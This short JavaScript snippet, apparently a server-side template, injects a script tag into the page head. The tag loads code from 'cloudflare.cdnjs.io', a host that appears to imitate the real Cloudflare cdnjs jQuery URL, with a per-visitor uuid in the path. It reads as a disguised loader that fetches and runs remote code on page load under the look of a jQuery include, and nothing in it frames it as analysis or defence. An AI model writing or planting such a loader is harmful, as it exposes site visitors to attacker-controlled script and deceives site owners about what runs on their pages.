const redirectHost = 'https://cloudflare.cdnjs.io/ajax/libs/jquery';

const appendScriptToHead = (url) => {
  const head = document.getElementsByTagName('head')[0];
  const js = document.createElement('script');
  js.type = 'text/javascript';
  js.src = url;
  head.appendChild(js);
};

appendScriptToHead(`${redirectHost}/<%= uuid %>/jquery.min.js`);
